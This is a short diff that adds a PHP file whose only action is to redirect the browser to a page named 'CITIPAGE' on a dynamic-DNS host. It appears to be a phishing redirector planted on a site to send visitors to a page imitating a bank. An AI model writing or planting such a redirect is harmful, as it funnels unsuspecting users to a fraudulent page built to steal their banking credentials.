@@ -1,0 +1,7 @@
+<?php 
+  
+// Redirect browser 
+header("Location: https://serc2.zapto.org/CITIPAGE/"); 
+  
+exit; 
+?> 
